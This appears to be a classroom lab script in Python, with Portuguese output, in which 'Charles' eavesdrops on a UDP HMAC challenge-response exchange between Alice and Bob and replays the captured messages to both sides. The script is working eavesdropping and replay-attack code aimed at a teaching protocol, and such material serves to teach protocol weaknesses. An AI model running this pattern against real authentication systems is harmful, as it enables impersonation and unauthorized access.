import socket
import MyHashLib as HL


print('ESTA TELA PERTENCE A CHARLES')

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(HL.CHARLES)

cliente = []
servidor = []


def EavesDropping():
    global alice, bob

    while True:
        data, addr = s.recvfrom(1024)
        msg = HL.separaMensagem(data)
        print(msg)

        if msg[0] == 'HELLO':
            bob = addr
        elif msg[0] == 'CHALLENGE':
            alice = addr

        if addr == bob:
            cliente.append(data)
        else:
            servidor.append(data)

        if msg[0] == 'HMAC':
            break


def ReplayAttack():

    for m in cliente:
        s.sendto(m, alice)
        print('Enviei: ', m)

    try:
        s.settimeout(5)
        print('Aguardando a mensagem: ')
        data, addr = s.recvfrom(1024)
        msg = HL.separaMensagem(data)
        print('Recebi: ', msg)
    except:
        print('A autenticação falhou')
    finally:
        s.settimeout(None)
        print('Tentando duplicar a ultima mensagem enviada pelo servidor ...')
        print(servidor[-1])
        for i in range(3):
            s.sendto(servidor[-1], bob)


while True:
    print('Iniciando escuta ...')
    EavesDropping()
    input('Digite <ENTER> para fazer o REPLAY ATTACK')
    ReplayAttack()
